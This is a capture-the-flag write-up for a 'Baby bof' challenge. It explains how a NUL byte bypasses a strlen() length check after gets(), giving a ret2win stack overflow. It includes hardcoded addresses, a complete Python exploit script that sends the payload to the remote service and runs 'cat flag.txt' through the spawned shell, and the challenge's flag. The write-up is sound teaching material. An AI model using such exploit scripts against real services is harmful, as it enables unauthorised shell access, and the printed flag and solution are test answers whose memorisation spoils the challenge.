# Baby bof - Write up (478 solves)

## Overview

You’re given a single ELF binary (`chall`) and a remote service:

- `nc 34.48.173.44 5000`
- Description: “People said gets is not safe, but I think I figured out how to make it safe.”

The intended bug is still a classic stack buffer overflow, but the author tries to “patch” it using a `strlen()` length check. The twist is that `strlen()` stops at the first `\\x00` (NUL byte), so you can **hide** a long payload from the check by placing a NUL early, while `gets()` continues reading and overflowing the stack.

## What the challenge is “hiding” (the trick)

The program does roughly this:

1. Read your name using `gets(buf)` into a small stack buffer.
2. Check `strlen(buf)`.
3. If the length is “too long”, exit.

That *sounds* safe… but it isn’t, because:

- `gets()` reads raw bytes until newline and **does not stop at NUL bytes**.
- `strlen()` counts characters **only until the first NUL byte**.

So you can send:

- `\\x00` (NUL) first → `strlen(buf) == 0` (passes the “safe” check)
- then keep sending many more bytes → `gets()` keeps writing → stack overflow happens anyway

This is exactly why “read first, then check length” is too late, and why `strlen()` is not a safe way to validate binary/byte input.

## Recon

List files:

```bash
ls -la
```

You should see:

- `chall` (the binary)
- `flag.txt` (local/test flag; remote flag is different)

Check protections (optional but useful):

```bash
checksec --file=chall
```

Expected key points:

- **No PIE** → function addresses are fixed (great for ret2win).
- **No canary** → simple stack overflow works.
- **NX enabled** → injecting shellcode on the stack won’t work, but we don’t need it.

## Understand the program (disassembly → pseudo-code)

Find the interesting functions:

```bash
nm -n chall | grep -E " win$| main$"
objdump -d chall | grep -nE "<win>|<main>|gets@plt|system@plt"
```

In this challenge you’ll find a `win()` function and a `main()` that uses `gets()` + `strlen()`.

### `win()`

`win()` calls `system("/bin/sh")`. This is your goal: redirect execution to `win()` (a “ret2win”).

### `main()`

The important part of `main()` looks like:

- stack allocates **0x10 bytes** → a **16-byte** buffer on the stack
- `gets(buf)` reads your input into that buffer (unsafe)
- `strlen(buf)` checks if it’s `> 0xE` (14)
- if longer: prints “Thats suspicious.” and exits
- else: prints `Hi, %s!` and returns normally

This is the “fake safety” check you bypass with a NUL byte.

## Exploitation strategy

### Step 1: Bypass the “safe” length check

Send a NUL byte as the very first byte of your input:

- `buf[0] = 0x00`
- `strlen(buf)` returns `0`
- check passes even though you’ll keep sending more bytes

You usually can’t type a NUL into `nc` by hand, so use a script (recommended) or a `printf` pipeline.

### Step 2: Find the overflow offset (where RIP is)

On x86_64 with a typical stack frame:

```
buf (16 bytes) | saved RBP (8 bytes) | saved RIP (8 bytes)
```

So the offset from the start of `buf` to the saved return address (RIP) is:

```
16 + 8 = 24 bytes
```

That means after 24 bytes, the next 8 bytes you send become the return address.

### Step 3: Jump to `win()` (ret2win)

Because NX is enabled, we don’t run shellcode; we just return into existing code:

```
RIP = address_of(win)
```

In practice, it’s common to add a single `ret` gadget before `win()` to fix 16-byte stack alignment issues when calling `system()`:

```
payload: [padding to RIP] + [ret] + [win]
```

You can use any `ret` instruction in the binary; one easy one is the `ret` at the end of `_init` (often near the start of the file).

## Final payload layout (what we send)

This is the working payload for this binary:

- `\\x00` + `A` * 23 → total 24 bytes (fills `buf` + saved RBP)
- `ret` gadget address (8 bytes, little endian)
- `win` address (8 bytes, little endian)

So:

```
payload = b\"\\x00\" + b\"A\"*23 + p64(ret) + p64(win)
```

For this challenge build:

- `win = 0x4011f6`
- an easy `ret = 0x40101a`

## Step-by-step solve script (no pwntools required)

Create a file `solve.py` somewhere (or just run this as a one-off) and run it with Python 3:

```python
import re
import socket
import struct

HOST, PORT = "34.48.173.44", 5000

WIN = 0x4011F6
RET = 0x40101A

def p64(x: int) -> bytes:
    return struct.pack("<Q", x)

def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

payload = b"\x00" + b"A" * 23 + p64(RET) + p64(WIN) + b"\n"

with socket.create_connection((HOST, PORT)) as s:
    recv_until(s, b"What is your name:")
    s.sendall(payload)
    s.sendall(b"cat flag.txt; echo __END__\n")
    out = recv_until(s, b"__END__")

m = re.search(rb"uoftctf\\{[^}]+\\}", out)
print(m.group(0).decode() if m else out.decode(errors="replace"))
```

Run:

```bash
python3 solve.py
```

## Why the output looks weird (“Hi, !”)

Because we deliberately put `\\x00` as the first byte, the name string is considered empty:

- `printf("Hi, %s!", buf)` prints nothing for `%s`
- you’ll see `Hi, !`

That’s normal and is actually a hint the NUL trick is working.

## Flag

`uoftctf{i7s_n0_surpris3_7h47_s7rl3n_s70ps_47_null}`

